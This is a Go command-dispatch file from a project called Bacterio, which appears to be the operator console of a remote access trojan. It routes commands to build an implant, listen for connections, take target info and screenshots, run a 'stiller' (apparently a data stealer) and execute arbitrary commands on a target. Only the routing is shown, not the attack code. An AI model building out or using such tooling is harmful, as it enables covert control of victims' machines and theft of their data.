package handler

import (
	"strings"

	"github.com/fatih/color"
	service "github.com/fr13n8/Bacterio/pkg/service/cli"
)

type Handler struct {
	services *service.Service
}

func NewHandler(services *service.Service) *Handler {
	return &Handler{services: services}
}

func (h *Handler) AppExecutor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch v {
		case "build":
			h.Build(values)
			return
		case "listen":
			h.Listen(values)
			return
		case "clear":
			h.services.App.ClearScreen()
		case "exit":
			h.Exit()
		default:
			color.Red(" [!] Invalid command!")
			return
		}
	}
}

func (h *Handler) ServerExecutor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "connects":
			h.ShowConnects()
			return
		case "connect":
			// h.services.App.ClearScreen()
			h.Connect(values)
			return
		case "exit":
			h.Exit()
		default:
			color.Red(" [!] Invalid command!")
			return
		}
	}
}

func (h *Handler) TargetExecutor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "info":
			h.GetTargetInfo()
		case "screenshot":
			h.GetScreenshot()
		case "stiller":
			h.RunStiller()
		case "exit":
			h.Exit()
		default:
			h.RunCommand(values)
		}
	}
}
